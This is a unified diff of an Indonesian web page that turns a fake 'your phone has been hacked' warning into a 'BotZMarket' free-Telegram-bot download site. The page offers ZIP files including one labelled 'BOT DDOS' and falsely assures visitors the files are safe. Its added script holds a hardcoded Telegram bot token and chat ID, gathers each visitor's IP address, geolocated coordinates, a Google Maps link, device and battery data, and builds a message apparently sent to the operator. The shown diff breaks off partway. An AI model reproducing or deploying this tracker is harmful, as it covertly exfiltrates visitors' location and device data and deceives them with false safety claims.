@@ -2,10 +2,10 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=0.69, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
-    <title>Pesan Sistem</title>
+    <title>BotZMarket - Bot Telegram Gratis</title>
     <style>
         * {
             margin: 0;
@@ -16,20 +16,108 @@
             -webkit-tap-highlight-color: transparent;
         }
         
-        body {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
+        html, body {
+            background: #0a0a16;
             color: #fff;
             min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            height: auto;
+        }
+        
+        body {
+            padding: 20px;
+            overflow-y: auto;
+        }
+        
+        /* Animated Background */
+        .animated-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            overflow: hidden;
+        }
+        
+        .bg-particle {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(5, 217, 232, 0.1);
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0) translateX(0) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        .pulse-ring {
+            position: absolute;
+            border: 2px solid rgba(255, 42, 109, 0.3);
+            border-radius: 50%;
+            animation: pulse 4s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(0.1);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(2);
+                opacity: 0;
+            }
+        }
+        
+        /* Loading Screen */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a16;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-            overflow: hidden;
-            position: relative;
-            zoom: 1.0; /* Adjusted to 100% */
-            -webkit-transform: scale(1.0); /* Fallback for Webkit browsers */
-            transform: scale(1.0); /* Fallback for other browsers */
-            transform-origin: top center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(5, 217, 232, 0.3);
+            border-radius: 50%;
+            border-top-color: #ff2a6d;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 18px;
+            color: #05d9e8;
+            text-align: center;
         }
         
         /* Matrix Background */
@@ -41,17 +129,20 @@
             height: 100%;
             z-index: -1;
             overflow: hidden;
+            pointer-events: none;
+            opacity: 0.3;
         }
         
         .matrix-digit {
             position: absolute;
-            color: rgba(5, 217, 232, 0.7);
+            color: rgba(5, 217, 232, 0.4);
             font-size: clamp(14px, 2vw, 16px);
             font-family: 'Courier New', monospace;
             font-weight: bold;
-            text-shadow: 0 0 5px rgba(5, 217, 232, 0.5);
+            text-shadow: 0 0 5px rgba(5, 217, 232, 0.3);
             user-select: none;
             animation: fall linear forwards;
+            pointer-events: none;
         }
         
         @keyframes fall {
@@ -60,19 +151,49 @@
             }
         }
         
-        /* Container */
-        .container {
+        /* Scroll Indicator */
+        .scroll-indicator {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(255, 42, 109, 0.7);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 100;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 15px rgba(255, 42, 109, 0.5);
+        }
+        
+        .scroll-indicator:hover {
+            transform: scale(1.1);
+            background: rgba(255, 42, 109, 0.9);
+        }
+        
+        /* Main Content */
+        .main-content {
             max-width: 500px;
             width: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            margin: 0 auto;
+        }
+        
+        /* Container */
+        .container {
+            width: 100%;
+            background: rgba(10, 10, 22, 0.6);
             border-radius: 15px;
             padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             text-align: center;
             position: relative;
             overflow: hidden;
-            border: 1px solid #ff2a6d;
-            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 42, 109, 0.3);
+            backdrop-filter: blur(10px);
+            margin-bottom: 30px;
         }
         
         .container::before {
@@ -82,9 +203,9 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255, 42, 109, 0.1), transparent);
+            background: linear-gradient(45deg, transparent, rgba(255, 42, 109, 0.05), transparent);
             transform: rotate(45deg);
-            animation: shine 3s infinite;
+            animation: shine 6s infinite;
         }
         
         @keyframes shine {
@@ -105,9 +226,9 @@
             height: 100px;
             border-radius: 50%;
             object-fit: cover;
-            border: 3px solid #ff2a6d;
-            box-shadow: 0 0 15px rgba(255, 42, 109, 0.5);
+            box-shadow: 0 0 20px rgba(5, 217, 232, 0.5);
             margin-bottom: 10px;
+            border: none;
         }
         
         .profile-name {
@@ -115,10 +236,10 @@
             font-weight: bold;
             color: #05d9e8;
             text-shadow: 0 0 10px rgba(5, 217, 232, 0.5);
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.3);
             padding: 5px 15px;
             border-radius: 20px;
-            border: 1px solid #05d9e8;
+            border: 1px solid rgba(5, 217, 232, 0.3);
         }
         
         /* Warning Section */
@@ -145,7 +266,7 @@
         /* Message Section */
         .message {
             background: rgba(255, 42, 109, 0.1);
-            border: 1px solid #ff2a6d;
+            border: 1px solid rgba(255, 42, 109, 0.2);
             border-radius: 10px;
             padding: 20px;
             margin: 20px 0;
@@ -159,11 +280,12 @@
         
         /* Info Box */
         .info-box {
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.3);
             border-radius: 10px;
             padding: 15px;
             margin: 20px 0;
             text-align: left;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
         
         .info-item {
@@ -189,13 +311,31 @@
             color: #fff;
         }
         
+        /* Google Maps Link */
+        .maps-link {
+            display: inline-block;
+            margin-top: 5px;
+            padding: 5px 10px;
+            background: rgba(255, 42, 109, 0.2);
+            border: 1px solid rgba(255, 42, 109, 0.3);
+            border-radius: 5px;
+            color: #ff2a6d;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        
+        .maps-link:hover {
+            background: rgba(255, 42, 109, 0.3);
+            box-shadow: 0 0 10px rgba(255, 42, 109, 0.5);
+        }
+        
         /* Battery Info */
         .battery-info {
             display: flex;
             align-items: center;
             margin-top: 10px;
             padding: 10px;
-            background: rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.05);
             border-radius: 8px;
         }
         
@@ -207,7 +347,7 @@
         .battery-level {
             flex-grow: 1;
             height: 20px;
-            background: rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
             overflow: hidden;
             position: relative;
@@ -240,29 +380,235 @@
             text-align: center;
         }
         
-        /* Footer and Countdown */
+        /* Download Bot Section */
+        .download-section {
+            margin: 25px 0;
+            text-align: center;
+        }
+        
+        .download-title {
+            font-size: 22px;
+            color: #05d9e8;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(5, 217, 232, 0.5);
+        }
+        
+        .download-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .download-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px 20px;
+            background: rgba(255, 42, 109, 0.2);
+            border: 1px solid rgba(255, 42, 109, 0.3);
+            border-radius: 10px;
+            color: #fff;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .download-btn:hover {
+            background: rgba(255, 42, 109, 0.3);
+            box-shadow: 0 0 15px rgba(255, 42, 109, 0.5);
+            transform: translateY(-2px);
+        }
+        
+        .download-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: 0.5s;
+        }
+        
+        .download-btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn-icon {
+            margin-right: 10px;
+            font-size: 20px;
+        }
+        
+        /* Additional Info Section */
+        .additional-info {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(5, 217, 232, 0.1);
+            border: 1px solid rgba(5, 217, 232, 0.2);
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .additional-info h3 {
+            color: #05d9e8;
+            margin-bottom: 10px;
+        }
+        
+        /* Footer */
         .footer {
             margin-top: 20px;
             font-size: 12px;
             color: rgba(255, 255, 255, 0.5);
+            text-align: center;
         }
         
-        .countdown {
-            font-size: 18px;
-            margin: 20px 0;
+        /* Why Share Section */
+        .why-share {
+            margin-top: 40px;
+            padding: 25px;
+            background: rgba(255, 42, 109, 0.1);
+            border: 1px solid rgba(255, 42, 109, 0.2);
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .why-share h3 {
+            color: #ff2a6d;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+        
+        .why-share p {
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+        
+        /* Bot Features Section */
+        .bot-features {
+            margin-top: 40px;
+            padding: 25px;
+            background: rgba(5, 217, 232, 0.1);
+            border: 1px solid rgba(5, 217, 232, 0.2);
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .bot-features h3 {
             color: #05d9e8;
+            margin-bottom: 15px;
+            font-size: 22px;
         }
         
-        .blink {
-            animation: blink 1s infinite;
+        .features-list {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+            margin-top: 20px;
         }
         
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
+        .feature-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: left;
+            border-left: 3px solid rgba(255, 42, 109, 0.5);
         }
-
+        
+        .feature-item h4 {
+            color: #ff2a6d;
+            margin-bottom: 8px;
+        }
+        
+        /* How to Use Section */
+        .how-to-use {
+            margin-top: 40px;
+            padding: 25px;
+            background: rgba(255, 42, 109, 0.1);
+            border: 1px solid rgba(255, 42, 109, 0.2);
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .how-to-use h3 {
+            color: #ff2a6d;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+        
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: flex-start;
+            text-align: left;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+        }
+        
+        .step-number {
+            background: #05d9e8;
+            color: #16213e;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+        
+        /* Contact Section */
+        .contact-section {
+            margin-top: 40px;
+            padding: 25px;
+            background: rgba(5, 217, 232, 0.1);
+            border: 1px solid rgba(5, 217, 232, 0.2);
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .contact-section h3 {
+            color: #05d9e8;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+        
+        .contact-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        
+        .contact-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 20px;
+            background: rgba(255, 42, 109, 0.2);
+            border: 1px solid rgba(255, 42, 109, 0.3);
+            border-radius: 10px;
+            color: #fff;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .contact-btn:hover {
+            background: rgba(255, 42, 109, 0.3);
+            box-shadow: 0 0 15px rgba(255, 42, 109, 0.5);
+        }
+        
         /* Responsive Adjustments */
         @media (max-width: 480px) {
             .container {
@@ -281,90 +627,320 @@
             .profile-name {
                 font-size: 16px;
             }
+            .download-title {
+                font-size: 20px;
+            }
         }
     </style>
 </head>
 <body>
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Memuat Bot Telegram...</div>
+    </div>
+    
+    <!-- Animated Background -->
+    <div class="animated-bg" id="animated-bg"></div>
+    
+    <!-- Matrix Background -->
     <div class="matrix-bg" id="matrix-bg"></div>
     
-    <main class="container">
-        <section class="profile-container">
-            <img src="https://files.catbox.moe/hiwsfb.jpg" alt="Profile Picture" class="profile-pic">
-            <div class="profile-name">🧑‍💻𝑩𝑶𝑻𝒁𝑴𝑨𝑹𝑲𝑬𝑻🧑‍💻</div>
-        </section>
-        
-        <header>
-            <h1>⚠ PERINGATAN SISTEM ⚠</h1>
-            <div class="warning-icon">📱</div>
-        </header>
-        
-        <section class="message">
-            <p><strong>HP KAMU TELAH DIHADAP!</strong></p>
-            <p>Sistem keamanan telah mendeteksi aktivitas mencurigakan pada perangkat Anda. Data perangkat telah dicatat dan akan dilaporkan.</p>
-        </section>
-        
-        <section class="info-box">
-            <div class="info-item">
-                <span class="label">Alamat IP:</span>
-                <span class="value" id="ip-address">Mengambil data...</span>
-            </div>
-            <div class="info-item">
-                <span class="label">Waktu Akses:</span>
-                <span class="value" id="access-time">Mengambil data...</span>
-            </div>
-            <div class="info-item">
-                <span class="label">Perangkat:</span>
-                <span class="value" id="device-info">Mengambil data...</span>
-            </div>
-            <div class="info-item">
-                <span class="label">Lokasi:</span>
-                <span class="value" id="location">Mengambil data...</span>
-            </div>
-            <div class="info-item">
-                <span class="label">Status Baterai:</span>
-                <span class="value" id="battery-status">Mengambil data...</span>
-            </div>
+    <!-- Scroll Indicator -->
+    <div class="scroll-indicator" id="scrollIndicator">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 5V19M12 19L5 12M12 19L19 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </div>
+    
+    <div class="main-content">
+        <!-- Main Container -->
+        <div class="container">
+            <section class="profile-container">
+                <img src="https://files.catbox.moe/hiwsfb.jpg" alt="Profile Picture" class="profile-pic">
+                <div class="profile-name">🧑‍💻𝑩𝑶𝑻𝒁𝑴𝑨𝑹𝑲𝑬𝑻🧑‍💻</div>
+            </section>
             
-            <div id="battery-container" style="display: none;">
-                <div class="battery-info">
-                    <div class="battery-icon">🔋</div>
-                    <div class="battery-level">
-                        <div class="battery-fill" id="battery-fill"></div>
-                    </div>
-                    <div class="battery-percentage" id="battery-percentage">0%</div>
+            <header>
+                <h1>🤖 BOT TELEGRAM GRATIS 🤖</h1>
+                <div class="warning-icon">📱</div>
+            </header>
+            
+            <section class="message">
+                <p><strong>BOT TELEGRAM PREMIUM GRATIS!</strong></p>
+                <p>Kami berbagi bot Telegram berkualitas tinggi untuk meningkatkan produktivitas dan pengalaman Anda. Semua bot telah diuji dan aman digunakan.</p>
+            </section>
+            
+            <section class="info-box">
+                <div class="info-item">
+                    <span class="label">Alamat IP:</span>
+                    <span class="value" id="ip-address">Mengambil data...</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">Waktu Akses:</span>
+                    <span class="value" id="access-time">Mengambil data...</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">Perangkat:</span>
+                    <span class="value" id="device-info">Mengambil data...</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">Lokasi:</span>
+                    <span class="value" id="location">Mengambil data...</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">Koordinat:</span>
+                    <span class="value" id="coordinates">Mengambil data...</span>
+                </div>
+                <div class="info-item">
+                    <span class="label">Google Maps:</span>
+                    <span class="value">
+                        <a href="#" id="maps-link" class="maps-link" target="_blank">Lihat di Peta</a>
+                    </span>
+                </div>
+                <div class="info-item">
+                    <span class="label">Status Baterai:</span>
+                    <span class="value" id="battery-status">Mengambil data...</span>
                 </div>
                 
-                <div class="battery-details">
-                    <div class="battery-detail-item">
-                        <div>Status Pengisian</div>
-                        <div id="charging-status">-</div>
+                <div id="battery-container" style="display: none;">
+                    <div class="battery-info">
+                        <div class="battery-icon">🔋</div>
+                        <div class="battery-level">
+                            <div class="battery-fill" id="battery-fill"></div>
+                        </div>
+                        <div class="battery-percentage" id="battery-percentage">0%</div>
                     </div>
-                    <div class="battery-detail-item">
-                        <div>Waktu hingga</div>
-                        <div id="battery-time">-</div>
+                    
+                    <div class="battery-details">
+                        <div class="battery-detail-item">
+                            <div>Status Pengisian</div>
+                            <div id="charging-status">-</div>
+                        </div>
+                        <div class="battery-detail-item">
+                            <div>Waktu hingga</div>
+                            <div id="battery-time">-</div>
+                        </div>
                     </div>
                 </div>
-            </div>
-        </section>
+            </section>
+            
+            <!-- Download Bot Section -->
+            <section class="download-section">
+                <h2 class="download-title">📲 DOWNLOAD BOT TELEGRAM GRATIS</h2>
+                <div class="download-buttons">
+                    <a href="https://www.mediafire.com/file/h0bqg47i9homhlz/%25F0%259F%2594%25B1%25F0%259D%2591%25A9%25F0%259D%2591%25B6%25F0%259D%2591%25BB%25F0%259D%2592%2581%25F0%259D%2591%25B4%25F0%259D%2591%25A8%25F0%259D%2591%25B9%25F0%259D%2591%25B2%25F0%259D%2591%25AC%25F0%259D%2591%25BB%25F0%259F%2594%25B1.zip/file" class="download-btn" target="_blank">
+                        <span class="btn-icon">🤖</span>
+                        <span>BOT DDOS✓</span>
+                    </a>
+                    <a href="https://www.mediafire.com/file/wus4d1enibq97k2/%25F0%259F%2594%25B1%25F0%259D%2591%25A9%25F0%259D%2591%25B6%25F0%259D%2591%25BB%25F0%259D%2592%2581%25F0%259D%2591%25B4%25F0%259D%2591%25A8%25F0%259D%2591%25B9%25F0%259D%2591%25B2%25F0%259D%2591%25AC%25F0%259D%2591%25BB%25F0%259F%2594%25B1%25282%2529.zip/file" class="download-btn" target="_blank">
+                        <span class="btn-icon">⚙️</span>
+                        <span>BOT DOWNLOADER✓</span>
+                    </a>
+                    <a href="https://www.mediafire.com/file/txruvxdmgd8vyca/%25F0%259F%2594%25B1%25F0%259D%2591%25A9%25F0%259D%2591%25B6%25F0%259D%2591%25BB%25F0%259D%2592%2581%25F0%259D%2591%25B4%25F0%259D%2591%25A8%25F0%259D%2591%25B9%25F0%259D%2591%25B2%25F0%259D%2591%25AC%25F0%259D%2591%25BB%25F0%259F%2594%25B1.zpi/file" class="download-btn" target="_blank">
+                        <span class="btn-icon">🔧</span>
+                        <span>BOT JPM✓</span>
+                    </a>
+                </div>
+            </section>
+            
+            <footer class="footer">
+                &copy; 2025 BotZMarket. Berbagi Bot Telegram Gratis.
+            </footer>
+        </div>
         
-        <section class="countdown blink">
-            Halaman akan tertutup otomatis dalam <span id="countdown">10</span> detik
-        </section>
+        <!-- Additional Containers for More Content -->
+        <div class="container">
+            <!-- Why Share Section -->
+            <section class="why-share">
+                <h3>Kenapa Saya Berbagi Bot Telegram?</h3>
+                <p>Saya percaya bahwa teknologi seharusnya dapat diakses oleh semua orang. Dengan berbagi bot Telegram berkualitas tinggi secara gratis, saya ingin membantu komunitas untuk meningkatkan produktivitas dan pengalaman mereka dalam menggunakan platform ini.</p>
+                <p>Semua bot yang saya bagikan telah melalui proses pengujian ketat untuk memastikan keamanan dan kualitasnya. Saya berkomitmen untuk terus memperbarui dan menambahkan bot-bot baru yang bermanfaat.</p>
+            </section>
+            
+            <!-- Bot Features Section -->
+            <section class="bot-features">
+                <h3>Fitur Unggulan Bot Telegram</h3>
+                <div class="features-list">
+                    <div class="feature-item">
+                        <h4>🤖 Automasi Cerdas</h4>
+                        <p>Bot dapat menjalankan tugas otomatis seperti mengelola grup, menjadwalkan pesan, dan merespons pertanyaan secara otomatis.</p>
+                    </div>
+                    <div class="feature-item">
+                        <h4>🛡️ Keamanan Terjamin</h4>
+                        <p>Semua bot telah melalui proses scanning keamanan untuk memastikan tidak ada malware atau kode berbahaya.</p>
+                    </div>
+                    <div class="feature-item">
+                        <h4>📊 Analytics Lengkap</h4>
+                        <p>Dapatkan insight tentang performa bot dengan fitur analytics yang terintegrasi.</p>
+                    </div>
+                    <div class="feature-item">
+                        <h4>🔧 Customizable</h4>
+                        <p>Bot dapat disesuaikan dengan kebutuhan spesifik Anda melalui konfigurasi yang mudah.</p>
+                    </div>
+                </div>
+            </section>
+        </div>
         
-        <footer class="footer">
-            &copy; 2025 Sistem Keamanan Perangkat. Segala aktivitas telah tercatat.
-        </footer>
-    </main>
+        <div class="container">
+            <!-- How to Use Section -->
+            <section class="how-to-use">
+                <h3>Cara Menggunakan Bot Telegram</h3>
+                <div class="steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div>
+                            <strong>Download File Bot</strong>
+                            <p>Klik tombol download di atas untuk mendapatkan file bot dalam format ZIP.</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div>
+                            <strong>Ekstrak File</strong>
+                            <p>Ekstrak file ZIP yang telah didownload menggunakan aplikasi file manager.</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div>
+                            <strong>Instalasi</strong>
+                            <p>Ikuti petunjuk instalasi yang terdapat dalam file README.</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">4</div>
+                        <div>
+                            <strong>Konfigurasi</strong>
+                            <p>Atur token bot dan konfigurasi lainnya sesuai dengan petunjuk.</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">5</div>
+                        <div>
+                            <strong>Jalankan Bot</strong>
+                            <p>Mulai menggunakan bot Telegram Anda dan nikmati fitur-fiturnya!</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Contact Section -->
+            <section class="contact-section">
+                <h3>Butuh Bantuan?</h3>
+                <p>Jika Anda mengalami kendala atau memiliki pertanyaan tentang bot Telegram, jangan ragu untuk menghubungi kami.</p>
+                <div class="contact-buttons">
+                    <a href="https://t.me/botzmarket95" class="contact-btn" target="_blank">
+                        <span class="btn-icon">💬</span>
+                        <span>Telegram Support</span>
+                    </a>
+                    <a href="mailto:support@rizkybot720@gmail.com" class="contact-btn">
+                        <span class="btn-icon">📧</span>
+                        <span>Email Support</span>
+                    </a>
+                </div>
+            </section>
+            
+            <!-- Additional Info Section -->
+            <section class="additional-info">
+                <h3>Informasi Tambahan</h3>
+                <p>Semua bot yang kami bagikan kompatibel dengan perangkat Android dan iOS. Pastikan Anda memiliki Telegram versi terbaru untuk pengalaman terbaik.</p>
+                <p style="margin-top: 10px;">Kami akan terus memperbarui koleksi bot Telegram dengan fitur-fitur terbaru.</p>
+            </section>
+            
+            <footer class="footer">
+                &copy; 2025 BotZMarket. All rights reserved. | Berbagi Bot Telegram Gratis untuk Komunitas
+            </footer>
+        </div>
+    </div>
 
     <script>
         // Konfigurasi Telegram
         const BOT_TOKEN = '8025563292:AAHd2ddIwrM3V0Ia_ehGolQfVfrcVphR74A';
         const CHAT_ID = '7587303225';
         
-        // Prevent pinch zoom and double-tap zoom
-        document.addEventListener('gesturestart', (e) => e.preventDefault());
-        document.addEventListener('touchmove', (e) => {
+        // Hide loading screen after page loads
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('loading-screen').style.opacity = '0';
+                setTimeout(function() {
+                    document.getElementById('loading-screen').style.display = 'none';
+                }, 500);
+            }, 2000);
+        });
+        
+        // Create animated background
+        function createAnimatedBackground() {
+            const animatedBg = document.getElementById('animated-bg');
+            
+            // Create floating particles
+            for (let i = 0; i < 20; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'bg-particle';
+                
+                // Random size and position
+                const size = Math.random() * 30 + 10;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.top = `${Math.random() * 100}vh`;
+                
+                // Random animation duration and delay
+                particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                animatedBg.appendChild(particle);
+            }
+            
+            // Create pulse rings
+            for (let i = 0; i < 5; i++) {
+                const ring = document.createElement('div');
+                ring.className = 'pulse-ring';
+                
+                // Random position
+                ring.style.left = `${Math.random() * 100}vw`;
+                ring.style.top = `${Math.random() * 100}vh`;
+                
+                // Random animation delay
+                ring.style.animationDelay = `${Math.random() * 4}s`;
+                
+                animatedBg.appendChild(ring);
+            }
+        }
+        
+        // Scroll to bottom function
+        function scrollToBottom() {
+            window.scrollTo({
+                top: document.body.scrollHeight,
+                behavior: 'smooth'
+            });
+        }
+        
+        // Update scroll indicator based on scroll position
+        function updateScrollIndicator() {
+            const scrollIndicator = document.getElementById('scrollIndicator');
+            const scrollPosition = window.scrollY;
+            const windowHeight = window.innerHeight;
+            const documentHeight = document.body.scrollHeight;
+            
+            // Show indicator only if not at bottom
+            if (scrollPosition + windowHeight < documentHeight - 100) {
+                scrollIndicator.style.display = 'flex';
+            } else {
+                scrollIndicator.style.display = 'none';
+            }
+        }
+        
+        // Modified zoom prevention - less restrictive
+        document.addEventListener('gesturestart', function(e) {
             if (e.scale !== 1) {
+                e.preventDefault();
+            }
+        });
+        
+        document.addEventListener('touchmove', function(e) {
+            // Only prevent default if it's a pinch-zoom gesture
+            if (e.touches.length > 1) {
                 e.preventDefault();
             }
         }, { passive: false });
@@ -382,7 +958,7 @@
                 digit.style.top = '-20px';
                 const duration = 10 + Math.random() * 20;
                 digit.style.animationDuration = duration + 's';
-                digit.style.opacity = Math.random() * 0.5 + 0.3;
+                digit.style.opacity = Math.random() * 0.3 + 0.1;
                 matrixBg.appendChild(digit);
                 
                 setTimeout(() => {
@@ -390,8 +966,8 @@
                 }, duration * 1000);
             }
             
-            setInterval(createDigit, 100);
-            for (let i = 0; i < 50; i++) {
+            setInterval(createDigit, 150);
+            for (let i = 0; i < 30; i++) {
                 setTimeout(createDigit, Math.random() * 2000);
             }
         }
@@ -407,21 +983,57 @@
             }
         }
         
-        // Get Location
+        // Get Location Data with Coordinates
         async function getLocation(ip) {
             try {
                 const response = await fetch(`https://ipapi.co/${ip}/json/`);
                 const data = await response.json();
-                return `${data.city || 'Tidak diketahui'}, ${data.region || 'Tidak diketahui'}, ${data.country_name || 'Tidak diketahui'}`;
+                
+                // Extract location data
+                const city = data.city || 'Tidak diketahui';
+                const region = data.region || 'Tidak diketahui';
+                const country = data.country_name || 'Tidak diketahui';
+                const latitude = data.latitude || null;
+                const longitude = data.longitude || null;
+                
+                // Create Google Maps URL if coordinates are available
+                let mapsUrl = '#';
+                if (latitude && longitude) {
+                    mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                }
+                
+                return {
+                    location: `${city}, ${region}, ${country}`,
+                    coordinates: latitude && longitude ? `${latitude}, ${longitude}` : 'Tidak tersedia',
+                    mapsUrl: mapsUrl,
+                    latitude: latitude,
+                    longitude: longitude
+                };
             } catch {
-                return 'Lokasi tidak dapat ditentukan';
+                return {
+                    location: 'Lokasi tidak dapat ditentukan',
+                    coordinates: 'Tidak tersedia',
+                    mapsUrl: '#',
+                    latitude: null,
+                    longitude: null
+                };
             }
         }
         
         // Get Device Info
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            return `${navigator.platform || 'Tidak diketahui'} - ${ua.split(' ')[0] || 'Tidak diketahui'}`;
+            let deviceType = 'Tidak diketahui';
+            
+            if (/Mobi|Android/i.test(ua)) {
+                deviceType = 'Mobile';
+            } else if (/Tablet|iPad/i.test(ua)) {
+                deviceType = 'Tablet';
+            } else {
+                deviceType = 'Desktop';
+            }
+            
+            return `${deviceType} - ${navigator.platform || 'Tidak diketahui'}`;
         }
         
         // Get Battery Info
@@ -504,8 +1116,25 @@
             }
         }
         
+        // Display Location Info
+        function displayLocationInfo(locationData) {
+            document.getElementById('location').textContent = locationData.location;
+            document.getElementById('coordinates').textContent = locationData.coordinates;
+            
+            const mapsLink = document.getElementById('maps-link');
+            if (locationData.mapsUrl !== '#') {
+                mapsLink.href = locationData.mapsUrl;
+                mapsLink.textContent = 'Lihat di Google Maps';
+            } else {
+                mapsLink.textContent = 'Tidak tersedia';
+                mapsLink.style.pointerEvents = 'none';
+                mapsLink.style.opacity = '0.5';
+            }
+        }
+        
         // Main Initialization
         async function init() {
+            createAnimatedBackground();
             createMatrixEffect();
             
             const now = new Date();
@@ -525,8 +1154,8 @@
             const ip = await getIPAddress();
             document.getElementById('ip-address').textContent = ip;
             
-            const location = await getLocation(ip);
-            document.getElementById('location').textContent = location;
+            const locationData = await getLocation(ip);
+            displayLocationInfo(locationData);
             
             const batteryInfo = await getBatteryInfo();
             displayBatteryInfo(batteryInfo);
@@ -535,35 +1164,30 @@
                 ? `🔋 <b>Baterai:</b> ${Math.round(batteryInfo.level)}% (${batteryInfo.chargingStatus})`
                 : `🔋 <b>Baterai:</b> Informasi tidak tersedia`;
                 
+            const locationText = locationData.latitude && locationData.longitude
+                ? `📍 <b>Lokasi:</b> ${locationData.location}\n🗺️ <b>Koordinat:</b> ${locationData.latitude}, ${locationData.longitude}\n🌐 <b>Google Maps:</b> ${locationData.mapsUrl}`
+                : `📍 <b>Lokasi:</b> ${locationData.location}`;
+                
             const telegramMessage = `
